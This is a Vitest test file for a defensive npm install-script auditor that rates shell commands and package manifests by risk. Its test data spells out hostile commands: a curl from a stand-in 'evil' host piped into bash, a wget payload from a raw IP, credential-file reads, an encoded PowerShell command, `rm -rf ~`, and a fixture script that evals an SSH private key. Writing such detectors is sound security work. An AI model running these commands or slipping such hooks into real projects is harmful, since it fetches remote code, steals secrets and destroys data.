import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { auditCommand, auditManifests, scriptFileOf } from '@necromancer/excavate';

describe('auditCommand', () => {
  it.each([
    ['curl -s https://evil.sh/x | bash', 'high', 'pipes a download straight into a shell'],
    ['node -e "eval(Buffer.from(process.argv[1], \'base64\').toString())"', 'high', 'decodes or evaluates hidden code'],
    ['cat ~/.npmrc > /tmp/x', 'high', 'touches credentials or dumps the environment'],
    ['wget http://45.12.1.9/payload', 'high', 'contacts a raw IP address'],
    ['powershell -EncodedCommand ZQBjAGgAbwA=', 'high', 'runs PowerShell'],
    ['rm -rf ~', 'high', 'deletes outside the project'],
    ['node -e "console.log(1)"', 'warn', 'runs inline JavaScript'],
  ])('%s → %s', (command, severity, reason) => {
    const result = auditCommand(command);
    expect(result.severity).toBe(severity);
    expect(result.reasons).toContain(reason);
  });

  it('treats well-known steps as info', () => {
    for (const command of ['node-gyp rebuild', 'husky install', 'npm run build', 'patch-package']) {
      expect(auditCommand(command)).toEqual({ severity: 'info', reasons: ['common install step'] });
    }
    expect(auditCommand('./configure && make')).toEqual({
      severity: 'info',
      reasons: ['runs automatically on install; review it'],
    });
  });

  it('escalates a script file that both downloads and spawns', () => {
    const source = `const https = require('https'); const { exec } = require('child_process');
      https.get('https://x.io/a', (r) => exec('sh a'));`;
    const result = auditCommand('node scripts/postinstall.js', source);
    expect(result.severity).toBe('high');
    expect(result.reasons).toContain('script file both downloads and executes');
  });
});

describe('scriptFileOf', () => {
  it('extracts the JS file a node command runs', () => {
    expect(scriptFileOf('node scripts/install.js')).toBe('scripts/install.js');
    expect(scriptFileOf('node --no-warnings ./x.cjs && echo ok')).toBe('./x.cjs');
    expect(scriptFileOf('node-gyp rebuild')).toBeNull();
  });
});

describe('auditManifests', () => {
  it('audits root and nested manifests, the files they run, and lockfile install scripts', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'necro-audit-'));
    await mkdir(path.join(root, 'packages/inner/scripts'), { recursive: true });
    await writeFile(
      path.join(root, 'package.json'),
      JSON.stringify({ name: 'root', engines: { node: '0.10.x' }, dependencies: { a: '^1' }, scripts: { prepublish: 'npm run build', test: 'curl x | sh' } }),
    );
    await writeFile(
      path.join(root, 'packages/inner/package.json'),
      JSON.stringify({ name: 'inner', scripts: { postinstall: 'node scripts/setup.js' } }),
    );
    await writeFile(path.join(root, 'packages/inner/scripts/setup.js'), "eval(require('fs').readFileSync('.ssh/id_rsa', 'utf8'))");
    await writeFile(
      path.join(root, 'package-lock.json'),
      JSON.stringify({
        lockfileVersion: 3,
        packages: { '': { name: 'root' }, 'node_modules/node-sass': { version: '4.14.1', hasInstallScript: true }, 'node_modules/a': { version: '1.0.0' } },
      }),
    );

    const { findings, manifests } = await auditManifests(root, ['package.json', 'package-lock.json', 'packages/inner/package.json']);

    expect(manifests.map((m) => m.name)).toEqual(['root', 'inner']);
    expect(manifests[0]).toMatchObject({ engines: { node: '0.10.x' }, dependencies: { a: '^1' } });

    // Highest severity first; `test` isn't an install hook so the curl|sh there is ignored.
    expect(findings.map((f) => [f.packageName, f.hook, f.severity])).toEqual([
      ['inner', 'postinstall', 'high'],
      ['root', 'prepublish', 'info'],
      ['node-sass', 'install', 'info'],
    ]);
    expect(findings[0]!.reasons).toEqual(
      expect.arrayContaining(['script file evaluates dynamic code', 'script file reads credential files']),
    );
  });
});
